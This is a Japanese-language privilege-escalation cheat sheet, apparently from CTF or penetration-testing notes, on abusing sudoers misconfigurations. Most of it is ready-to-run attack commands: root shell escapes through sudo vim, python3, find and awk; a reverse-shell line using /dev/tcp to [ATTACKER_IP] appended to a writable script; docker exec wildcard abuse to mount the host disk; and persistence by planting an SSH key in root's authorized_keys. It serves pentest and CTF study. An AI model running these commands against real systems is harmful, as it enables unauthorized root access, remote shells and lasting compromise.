# sudo 設定不備による権限昇格

## 概要

`/etc/sudoers` の設定ミスにより、特定のコマンドをパスワードなしで root として実行できる場合がある。

---

## 着火条件

```bash
sudo -l
```

出力に `NOPASSWD` または特定コマンドへの許可が含まれている場合。

---

## 典型的な出力パターンと対応

### パターン1: 特定コマンドに NOPASSWD

```
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
(ALL) NOPASSWD: /usr/bin/find
```

→ GTFOBins で対象コマンドの「Sudo」セクションを確認

### パターン2: ALL コマンドを許可

```
(ALL) NOPASSWD: ALL
```

→ `sudo /bin/bash` で即座に root

### パターン3: 特定スクリプトの実行を許可

```
(ALL) NOPASSWD: /opt/scripts/backup.sh
```

→ スクリプト自体が書き込み可能であれば改ざんして権限昇格

---

## 悪用手順

### vim / nano / less

```bash
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

### python / python3

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### find

```bash
sudo find . -exec /bin/bash \; -quit
```

### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 任意スクリプトが書き込み可能な場合

```bash
# スクリプトにリバースシェルを追記
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh

# sudo で実行
sudo /opt/scripts/backup.sh
```

---

## 注意点・落とし穴

- `sudo -l` でパスワードを求められる場合でも、現在のユーザーのパスワードが判明していれば入力できる
- `env_keep` の設定次第では環境変数（`LD_PRELOAD` 等）を引き継いで悪用できる
- sudoers の `!root` 指定（特定ユーザー以外として実行）は古い sudo でバイパスできる場合がある（CVE-2019-14287）

---

---

## パターン4: docker exec へのワイルドカード NOPASSWD

### 着火条件
`sudo -l` の出力に以下のようなエントリがある場合：

```
(root) NOPASSWD: /snap/bin/docker exec *
(root) NOPASSWD: /usr/bin/docker exec *
```

ワイルドカード `*` により、`docker exec` のオプションを自由に指定できる。

### 観点・着眼点
`docker exec` は実行中コンテナにプロセスを起動する。`--user root` フラグを付けることで、コンテナ内で root として実行できる。さらに、コンテナがホストのブロックデバイス（`/dev/sda1` 等）にアクセスできる場合はホストのファイルシステム全体をマウントして読み書きが可能。

**コンテナIDを特定する方法：**
- `cat /etc/hosts`（コンテナ内からアクセスできている場合）→ ホスト名が16進文字列
- パストラバーサル等で `/etc/hosts` を読み取った場合も同様

### 手順

**ステップ1: コンテナIDの特定**
```bash
# /etc/hosts の確認（コンテナ内でのホスト名 = コンテナID）
# パストラバーサルで読み取った場合も同様
# 出力例: 172.17.0.2   e6ff5b1cbc85
```

**ステップ2: コンテナ内で root として実行できるか確認**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] id
# uid=0(root) gid=0(root) groups=0(root),...
```

**ステップ3a: コンテナ内でシェルを取得**
```bash
sudo /snap/bin/docker exec --user root [CONTAINER_ID] /bin/sh
# または
sudo /snap/bin/docker exec -it --user root [CONTAINER_ID] /bin/bash
```

**ステップ3b: ホストのブロックデバイスをマウント（Docker ブレイクアウト）**

コンテナが privileged モードで動作しているか、ホストのデバイスにアクセスできる場合：

```bash
# ブロックデバイスの確認
sudo /snap/bin/docker exec --user root [CONTAINER_ID] ls /dev/sd*

# ホストのルートパーティションをマウント
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host'

# ホストのファイルを読み取る
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'cat /mnt/host/root/root.txt'

# ホストに root SSH 公開鍵を書き込む（永続化）
sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
  sh -c 'echo "ssh-rsa [YOUR_PUBKEY]" >> /mnt/host/root/.ssh/authorized_keys'
```

### 注意点・落とし穴
- コンテナが通常モード（non-privileged）でも `/dev/sda*` が見えることがある。見えたらマウントを試みる
- `-it` フラグ（インタラクティブ + TTY）は TTY を確保するが、環境によっては動作しない。その場合は `-i` のみ、または `sh -c '[COMMAND]'` を使う
- マウント後のパスはコンテナ内のパス。ホストの `/root/root.txt` は `/mnt/host/root/root.txt` でアクセス
- ホストのファイルシステムへの書き込みも可能なため、SSH 鍵の埋め込みや `/etc/passwd` の書き換えも実施できる

---

## 関連技術
- GTFOBins: https://gtfobins.github.io/
- その他の昇格手法 → `Capabilities.md`, `SUID_SGID.md`
- パストラバーサルでコンテナIDを特定 → `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
